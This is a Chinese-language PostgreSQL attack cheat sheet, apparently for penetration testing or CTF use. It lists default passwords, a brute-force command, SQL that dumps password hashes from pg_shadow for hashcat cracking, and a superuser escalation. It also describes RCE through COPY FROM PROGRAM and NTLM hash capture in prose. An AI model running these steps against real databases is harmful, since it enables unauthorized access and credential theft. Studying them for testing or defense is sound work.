# PostgreSQL 攻击详解

## 1. 连接与认证

```bash
# psql 连接
psql -h TARGET -U postgres -d postgres
psql "host=TARGET user=postgres password=PASSWORD dbname=postgres"

# netexec 爆破
netexec ssh TARGET -u users.txt -p passwords.txt  # 如果 SSH 也开放
```

### 默认/弱口令
```
postgres : postgres
postgres : (空)
postgres : 123456
postgres : admin
```

### 常见认证绕过
```bash
# pg_hba.conf 配置为 trust → 无密码连接
psql -h TARGET -U postgres -w
```

## 2. 命令执行

### 2.1 COPY FROM PROGRAM

PostgreSQL 9.3+ 的 `COPY FROM PROGRAM` 允许 superuser 执行系统命令，是最直接的 RCE 路径。

### 2.2 UDF / PL/Python / PL/Perl

通过创建自定义函数（C 语言 UDF 或 PL/Python、PL/Perl 扩展语言）实现命令执行。

## 3. 文件读写

利用 COPY TO/FROM、pg_read_file()、lo_import/lo_export 等方式进行文件读写操作。

## 4. 信息收集

```sql
-- 版本
SELECT version();

-- 当前用户
SELECT current_user;
SELECT session_user;

-- 是否 superuser
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;

-- 列出用户
SELECT usename, usesuper, passwd FROM pg_shadow;

-- 列出数据库
SELECT datname FROM pg_database;

-- 列出表
SELECT table_schema, table_name FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema', 'pg_catalog');

-- 搜索 flag
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name LIKE '%flag%';

-- pg_hba.conf 位置
SHOW hba_file;

-- 数据目录
SHOW data_directory;
```

## 5. 提权

### 5.1 从普通用户到 superuser
```sql
-- 如果有 ALTER ROLE 权限
ALTER ROLE current_user WITH SUPERUSER;

-- 如果数据库密码可破解
SELECT usename, passwd FROM pg_shadow;
-- 格式: md5{32hex} → hashcat -m 12 破解
```

### 5.2 从 PostgreSQL 到 OS root
```bash
# PostgreSQL 通常以 postgres 用户运行
# 提权方式取决于 OS：
# 1. sudo -l（postgres 用户可能有 sudo 权限）
# 2. 写 crontab
# 3. CVE（如 CVE-2019-9193 - COPY FROM PROGRAM 在某些配置下非 superuser 也能用）
```

## 6. NTLM Hash 窃取（Windows PostgreSQL）

在 Windows 环境下，利用 COPY FROM PROGRAM 或 lo_import 触发 UNC 路径访问，配合 Responder 捕获 NTLM Hash。

## 7. COPY FROM PROGRAM 补充说明

PostgreSQL 9.3+ 的 `COPY FROM PROGRAM` 可能被视为"功能"而非漏洞。但如果 pg_hba.conf 允许远程连接且使用弱密码，这等于直接 RCE。
